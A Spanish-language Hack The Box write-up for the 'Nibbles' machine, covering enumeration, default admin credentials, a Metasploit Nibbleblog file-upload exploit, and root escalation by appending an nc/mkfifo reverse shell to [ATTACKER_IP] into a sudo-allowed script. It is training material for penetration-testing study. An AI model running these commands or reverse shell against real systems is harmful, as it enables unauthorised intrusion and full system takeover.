---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Easy
  - HTTP
  - Searchsploit
  - ArbitraryFileUpload
  - Sudo
  - ReverseShell
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Enumeración del sistema|Enumeración del sistema]]
	- [[#Enumeración#Enumeración de puertos|Enumeración de puertos]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
	- [[#Enumeración#Searchsploit|Searchsploit]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Arbitrary File Upload|Arbitrary File Upload]]
- [[#Escalada de Privilegios|Escalada de Privilegios]]
	- [[#Escalada de Privilegios#Sudo|Sudo]]
	- [[#Escalada de Privilegios#Reverse Shell|Reverse Shell]]

---
# Nibbles

![](Screenshots/Pasted%20image%2020260503192127.png)

>Máquina de Hack The Box llamada **[Nibbles](https://app.hackthebox.com/machines/Nibbles)**, centrada en la explotación de un CMS vulnerable (**Nibbleblog**) que permite subida arbitraria de archivos.  
>La intrusión comienza con la enumeración del servicio web, donde se identifica un panel de administración accesible con credenciales por defecto.  
>A partir de ahí, se explota una vulnerabilidad de **file upload**, obteniendo acceso inicial al sistema como el usuario `nibbler`.  
>Finalmente, mediante una mala configuración de **sudo**, se modifica un script ejecutado como root para conseguir una reverse shell con privilegios elevados.

---
## Enumeración
### Enumeración del sistema

```PowerShell
ping -c 1 10.129.96.84
PING 10.129.96.84 (10.129.96.84) 56(84) bytes of data.
64 bytes from 10.129.96.84: icmp_seq=1 ttl=63 time=43.7 ms

--- 10.129.96.84 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 43.703/43.703/43.703/0.000 ms
```

El TTL de `63` (típico en redes Linux con decremento de 1 salto) sugiere que el sistema objetivo es Linux.
### Enumeración de puertos

```PowerShell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.96.84 -oG allPorts
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

```PowerShell
nmap -p22,80 -sCV 10.129.96.84 -oN targeted
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Puertos descubiertos:
- `22 → SSH`
- `80 → HTTP`
### HTTP

```HTTP
http://10.129.96.84/
```

![](Screenshots/Pasted%20image%2020260503192800.png)

Se revisa el código fuente en busca de rutas ocultas o información relevante, identificando el directorio `/nibbleblog/`.

![](Screenshots/Pasted%20image%2020260503192937.png)

```HTTP
http://10.129.96.84/nibbleblog/
```

![](Screenshots/Pasted%20image%2020260504124318.png)
#### Fuzzing Web

```PowerShell
dirb http://10.129.96.84/nibbleblog/
---- Scanning URL: http://10.129.96.84/nibbleblog/ ----
==> DIRECTORY: http://10.129.96.84/nibbleblog/admin/                                                                                                                                                                                       
+ http://10.129.96.84/nibbleblog/admin.php (CODE:200|SIZE:1401)                                                                                                                                                                            
==> DIRECTORY: http://10.129.96.84/nibbleblog/content/                                                                                                                                                                                     
+ http://10.129.96.84/nibbleblog/index.php (CODE:200|SIZE:2987)                                                                                                                                                                            
==> DIRECTORY: http://10.129.96.84/nibbleblog/languages/                                                                                                                                                                                   
==> DIRECTORY: http://10.129.96.84/nibbleblog/plugins/                                                                                                                                                                                     
+ http://10.129.96.84/nibbleblog/README (CODE:200|SIZE:4628)                                                                                                                                                                               
==> DIRECTORY: http://10.129.96.84/nibbleblog/themes/                                                                                                                                                                                      
---- Entering directory: http://10.129.96.84/nibbleblog/admin/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
---- Entering directory: http://10.129.96.84/nibbleblog/content/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
---- Entering directory: http://10.129.96.84/nibbleblog/languages/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
---- Entering directory: http://10.129.96.84/nibbleblog/plugins/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
---- Entering directory: http://10.129.96.84/nibbleblog/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
```

Se encuentra un directorio `admin`.

```HTTP
http://10.129.96.84/nibbleblog/admin.php
```

![](Screenshots/Pasted%20image%2020260504124916.png)

Se encuentra un panel de login, se prueban credenciales por defecto comunes para este CMS, logrando acceso con `admin:nibbles`.

![](Screenshots/Pasted%20image%2020260504125300.png)
### Searchsploit

Se busca vulnerabilidades.

```PowerShell
searchsploit "Nibbleblog"
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                                                                                                                                                   | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                                                                                                                                    | php/remote/38489.rb
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Se identifican vulnerabilidades conocidas para Nibbleblog, destacando una vulnerabilidad de **arbitrary file upload** en la versión 4.0.3.

---
## Explotación
### Arbitrary File Upload

Esta vulnerabilidad permite subir archivos maliciosos al servidor, lo que posibilita la ejecución remota de código mediante una web shell.

Se utiliza el módulo de Metasploit para automatizar la explotación de la vulnerabilidad de subida de archivos y obtener una reverse shell.

```PowerShell
msfconsole -q
search Nibbleblog
Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability

use 0 | use exploit/multi/http/nibbleblog_file_upload
show options
Module options (exploit/multi/http/nibbleblog_file_upload):
   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the web application
   USERNAME                    yes       The username to authenticate with
   VHOST                       no        HTTP server virtual host

Payload options (php/meterpreter/reverse_tcp):
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  [ATTACKER_IP]     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:
   Id  Name
   --  ----
   0   Nibbleblog 4.0.3

set PASSWORD nibbles
set RHOSTS 10.129.96.84
set TARGETURI /nibbleblog/
set USERNAME admin
set LHOST [ATTACKER_IP]
exploit
```

Se obtiene una consola interactiva con el usuario `nibbler`.

La flag de `usuario` se encuentra en: `/home/nibbler`.

---
## Escalada de Privilegios
### Sudo

Se observa que el usuario `nibbler` puede ejecutar el script `monitor.sh` como root sin contraseña.

```PowerShell
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Se accede al directorio `/home/nibbler`.

Se enumera.

```PowerShell
ls -la
-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip

# Se descomprime
unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh
cd personal/stuff
ls -la
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER_IP] 9001 > /tmp/f" >> monitor.sh
```

El script tiene permisos de escritura global (`777`), lo que permite modificar su contenido y ejecutar comandos arbitrarios como root.

Se añade una reverse shell al script para que, al ejecutarse con sudo, establezca una conexión como root hacia la máquina atacante.
### Reverse Shell

Máquina atacante:

```PowerShell
nc -nlvp 9001
```

Máquina victima:

```PowerShell
sudo /home/nibbler/personal/stuff/monitor.sh
```

Se obtiene una consola interactiva con `root`.

La flag de `root` se encuentra en: `/root`.

---